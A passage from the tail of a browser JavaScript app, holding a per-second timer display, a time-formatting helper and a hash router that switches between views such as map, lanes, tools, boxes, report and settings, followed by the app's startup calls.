  if (state.timerStart){ d = Date.now() - state.timerStart; el.style.color = ''; el.textContent = '▴ ' + fmtT(d); return; }
  el.textContent = '--:--:--'; el.style.color = '';
}, 1000);
function fmtT(d){
  const h = Math.floor(d/3600000), m = Math.floor(d%3600000/60000), s = Math.floor(d%60000/1000);
  return String(h).padStart(2,'0') + ':' + String(m).padStart(2,'0') + ':' + String(s).padStart(2,'0');
}

// ---------- router ----------
function route(){
  const hash = location.hash || '#/map';
  const parts = hash.slice(2).split('/');
  document.querySelectorAll('nav a').forEach(a => a.classList.toggle('active', a.dataset.nav === parts[0] || (parts[0]==='card' && a.dataset.nav==='lanes') || (parts[0]==='state' && a.dataset.nav==='map')));
  if (parts[0] === 'map' || !parts[0]) viewMap();
  else if (parts[0] === 'state') viewState(parts[1]);
  else if (parts[0] === 'lanes') viewLanes(parts[1]);
  else if (parts[0] === 'tools') viewTools(parts[1] ? decodeURIComponent(parts[1]) : null);
  else if (parts[0] === 'card') viewCard(parts[1]);
  else if (parts[0] === 'stuck') viewStuck();
  else if (parts[0] === 'boxes') viewBoxes();
  else if (parts[0] === 'report') viewReport();
  else if (parts[0] === 'guide') viewGuide();
  else if (parts[0] === 'settings') viewSettings();
  window.scrollTo(0,0);
}

$('#progress').addEventListener('click', () => location.hash = '#/report');
window.addEventListener('hashchange', route);
// On narrow screens the sidebar lives above the content — start it collapsed.
if (window.matchMedia('(max-width:1100px)').matches) $('#side-details').removeAttribute('open');
load(); renderSidebar(); renderProgress(); renderBanner(); route();
})();
